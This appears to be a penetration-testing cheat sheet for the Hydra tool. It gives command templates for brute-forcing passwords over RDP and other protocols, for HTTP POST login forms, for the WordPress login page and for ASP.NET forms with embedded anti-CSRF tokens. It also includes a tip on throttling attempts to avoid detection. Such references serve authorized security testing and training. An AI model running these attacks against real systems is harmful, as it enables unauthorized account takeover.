**Tool Usage**
```
hydra -P <wordlist> -v <ip> <protocol>
```

---

**Brute Force Attack trying all Passwords**
```
hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
```
- `-v:` Verbose mode
- `-V:` Very verbose (shows every attempt)
- `-u:` tries each username with all passwords
- `-t1:` sets one concurrent connection (useful for avoiding detection or throttling)

****

**Attack against a Protocol**
```
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
```
- `-f:` stops the attack as soon as a valid password is found

---
### HTTP-Form

**Brute Force Against an HTTP Login Form using a single Username and a Password**
```
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```


**Brute Force against a WordPress Login Form, checking for a Redirect upon Success**
```
hydra -l <username> -P <password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
- `http-form-post`: Specifies a brute-force attack against an HTTP POST form.
- `'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
    - `/wp-login.php`: Target login page (WordPress login form).
    - `log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1`: HTTP POST request format.
    - `S=Location`: Success condition (if response contains "Location" header, login was successful).


**ASP.NET Forms**
These forms usually use ***anti-CSRF*** mechanisms like `__VIEWSTATE` and `__EVENTVALIDATION`, and similar ***dynamic hidden fields***. These ***tokens change with each request and are required to be valid for login***. Hydra, in its default mode, sends the same ***static request for every password attempt***, so it doesn't update the tokens each time.
```
hydra -l <username> -P <password list> $ip -V http-form-post '/login.aspx?ReturnURL=/admin:__VIEWSTATE=UrqWb2RL8KZfJ91A8QYxfD60ktVv6Py1u2d6mDtcZHGE8QDoKbcA%2FsOAO3AJ6V0Cykk7WUn2FfjxH0xcS6N8IU3dK006iPXo5BH2GeElwUQpPK%2FwxfTRmJ5UbZVzX8FhKS02Db8PEfnMZpVb6np3Wf5girU2sucKJC7R%2F2CykMXeKHWC&__EVENTVALIDATION=ylQOemUDKmktcu7LCTC93iTRqzy9s80fHyH2tfu2UXas4EaglWlzYacvQluQAQflrDZm8DttbbGtEFHIIjLybaLlEsthWfdHBkVRwBkPR1rYEG2qUeVQGlziLsVcnCrimV3itOOd4DdCIUYjBj9sbZy1GEmKxy06rydTPGIGzXxVssTX&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed'
```
- `Things to Change:`
	- `/login.aspx?ReturnURL=/admin:`
	- `^PASS^`
	- `Login Failed`